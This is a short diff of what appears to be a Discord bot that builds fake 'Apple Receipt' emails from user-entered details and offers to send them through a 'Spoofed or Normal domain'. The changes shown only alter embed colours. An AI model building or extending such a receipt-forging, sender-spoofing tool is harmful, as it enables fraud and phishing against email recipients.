@@ -134,7 +134,7 @@ class applemodal2(ui.Modal, title="Apple Receipt"):
                 # Set default empty values if no user details found
                 name = street = city = zipp = country = email = ""
 
-            embed = discord.Embed(title="Under Process...", description="Processing your email will be sent soon!", color=0x1e1f22)
+            embed = discord.Embed(title="Under Process...", description="Processing your email will be sent soon!", color=discord.Color.from_str("#826bc2"))
             await interaction.response.edit_message(embed=embed, view=None)
 
 
@@ -282,7 +282,7 @@ class applemodal2(ui.Modal, title="Apple Receipt"):
             link = "https://apple.com/"
 
 
-            embed = discord.Embed(title="Choose email provider", description="Email is ready to send choose Spoofed or Normal domain.", color=0x1e1f22)
+            embed = discord.Embed(title="Choose email provider", description="Email is ready to send choose Spoofed or Normal domain.", color=discord.Color.from_str("#826bc2"))
             view = choiseView(owner_id, html_content, sender_email, subject, product_name, image_url, link)
             await interaction.edit_original_response(embed=embed, view=view)
 
